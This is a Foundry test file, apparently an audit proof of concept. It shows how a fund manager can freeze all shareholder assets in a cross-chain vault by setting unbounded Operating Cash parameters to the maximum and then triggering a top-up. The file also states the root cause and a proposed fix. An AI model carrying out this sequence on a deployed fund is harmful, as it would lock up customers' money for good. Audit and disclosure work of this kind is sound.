// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {ISpokeVault} from "../../../src/interfaces/ISpokeVault.sol";
import {TransferKind} from "../../../src/interfaces/FundTypes.sol";
import {CrossChainFixture} from "./helpers/CrossChainFixture.sol";

/// @title PoC: unbounded Operating Cash parameters move every bridged transfer and all Free Idle out of Share Assets for good
/// @notice Finding (high; a business rule that creates the risk: DEC-096, DEC-100). Lens: cross-chain messaging and
///         bridging (the spoke's arrival callback runs the top-up), with the same effect on the hub.
///
/// Root cause, two facts together:
/// - the manager sets the Operating Cash floor and top-up on a live fund with no bound
///   (`SpokeVault.setOperatingCashParameters`, `CoreVault.setOperatingCashParameters`; DEC-100: "no protocol cap on the
///   floor"), and the top-up is `min(topUp, Unallocated Balance)` on a spoke or `min(topUp, Free Idle)` on the hub;
/// - Operating Cash only ever grows: no function spends it or returns it (spending is OPEN, doc 30), it is outside
///   Share Assets, outside every Payout, and inside the ledger, so `sweepExcess` cannot move it either.
/// The top-up runs on every value-moving operation, including `SpokeVault.handleV3AcrossMessage`, which anyone can
/// reach through Across (OQ-01).
///
/// Attack (the manager, two transactions per chain; or one and a stranger's dust fill):
/// 1. `SpokeVault.setOperatingCashParameters(type(uint256).max, type(uint256).max)`.
/// 2. Any operation on the spoke: here a stranger's 1 USDG Across fill. The arrival callback tops Operating Cash up
///    with the spoke's whole Unallocated Balance. From then on every transfer the hub sends is swept on arrival.
/// 3. On the hub: `CoreVault.setOperatingCashParameters(max, freeIdle - 1 USDC)` and `allocateToHubSpokeVault(1 USDC)`:
///    the top-up takes all Free Idle but the 1 USDC the call itself moves.
///
/// Impact: the fund's USDC and USDG are still in the vaults, but in a bucket no Shareholder can ever be paid from.
/// Share Assets fall to zero: a permanent freeze of customer funds by one role, inside the Mandate, with no recovery
/// path (the contracts are immutable). Here 99,724 of the fund's 99,725 USDC of Share Assets are frozen.
///
/// Fix: cap both parameters with core constants (DEC-096 speaks of about 5 and 10 USD), or cap the top-up per
/// operation and per period as a share of Share Assets; and give Operating Cash an exit that returns it to
/// Shareholders (DEC-096: at fund close it is distributed to them). DEC-100's "no protocol cap" needs a new ruling.
contract OperatingCashSweepPoC is CrossChainFixture {
    function test_POC_operatingCashParametersSweepBridgedPrincipal() public {
        // A fund with half of its capital on Robinhood, confirmed by a report.
        _deposit(alice, 100_000e6);
        (, uint256 depositId) = _sendToSpoke(50_000e6, 49_975e6);
        _fillOnSpoke(depositId);
        _reportAndDeliver(900);
        assertEq(core.shareAssets(), SEED_IDLE + 99_725e6);

        // 1. The manager lifts the spoke's floor and top-up to the maximum.
        vm.chainId(SPOKE);
        vm.prank(manager);
        spoke.setOperatingCashParameters(type(uint256).max, type(uint256).max);

        // 2. The next operation, here anybody's 1 USDG Across fill, sweeps the whole Unallocated Balance.
        _strangerFillOnSpoke(attacker, keccak256("any id"), 1e6, TransferKind.Principal);
        vm.chainId(SPOKE);
        assertEq(spoke.unallocatedBalance(address(usdg)), 0, "nothing left to allocate or send home");
        assertEq(spoke.operatingCash(), 49_976e6, "all of it is Operating Cash now");

        // The manager cannot undo it: lowering the parameters does not move Operating Cash back, nothing spends it, the
        // garbage collector does not touch it and a transfer home has nothing to send.
        vm.startPrank(manager);
        spoke.setOperatingCashParameters(0, 0);
        vm.expectPartialRevert(ISpokeVault.InsufficientUnallocatedBalance.selector);
        spoke.sendToHub(1e6, TransferKind.Principal, 0, _quote(1e6));
        vm.stopPrank();
        assertEq(spoke.sweepExcess(address(usdg)), 0);
        assertEq(spoke.operatingCash(), 49_976e6);
        assertEq(usdg.balanceOf(address(spoke)), 49_976e6, "the USDG never left the vault");
        vm.chainId(HUB);

        // The next report takes the spoke's principal out of Share Assets.
        _reportAndDeliver(900);
        assertEq(
            core.shareAssets(), SEED_IDLE + 49_749e6, "Idle only, less the stranger's unit of unknown-origin value"
        );

        // 3. The same on the hub: all Free Idle but the 1 USDC the triggering call moves.
        uint256 freeIdle = core.freeIdle();
        vm.startPrank(manager);
        core.setOperatingCashParameters(type(uint256).max, freeIdle - 1e6);
        core.allocateToHubSpokeVault(1e6);
        vm.stopPrank();
        assertEq(core.idle(), 0);
        assertEq(core.operatingCash(), freeIdle - 1e6);
        assertEq(usdc.balanceOf(address(core)), freeIdle - 1e6, "the USDC never left the vault");
        assertEq(core.sweepExcess(address(usdc)), 0);

        // Alice's 99,750 shares are backed by nothing; 99,724 USDC and USDG of the fund sit frozen in the two vaults.
        assertEq(core.shareAssets(), 0);
        assertEq(shares.balanceOf(alice), 99_750e18);
    }
}
